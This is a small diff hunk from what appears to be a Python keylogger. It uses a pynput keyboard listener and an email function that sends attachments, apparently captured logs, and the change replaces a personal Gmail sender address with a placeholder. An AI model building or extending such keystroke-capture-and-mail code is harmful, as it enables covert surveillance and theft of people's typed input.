@@ -100,7 +100,7 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
 
 
 def send_email(filename, attachment, toaddr):
-    fromaddr = "shashank8801@gmail.com"
+    fromaddr = "email@email.com"
     msg = MIMEMultipart()  # format emailmessages to characters texts and email attachments
 
     msg['From'] = fromaddr
